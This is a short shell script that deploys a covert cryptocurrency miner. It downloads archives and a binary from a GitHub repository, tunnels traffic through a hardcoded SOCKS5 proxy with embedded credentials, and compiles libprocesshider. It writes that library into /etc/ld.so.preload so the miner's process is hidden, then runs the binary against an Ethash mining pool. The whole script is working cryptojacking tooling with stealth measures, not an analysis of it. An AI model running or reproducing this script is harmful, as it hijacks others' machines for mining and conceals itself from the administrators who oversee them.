#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.223.155.101:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek

chmod +x pepek

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip

unzip pepek.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./pepek --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800 --user teguhcong.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
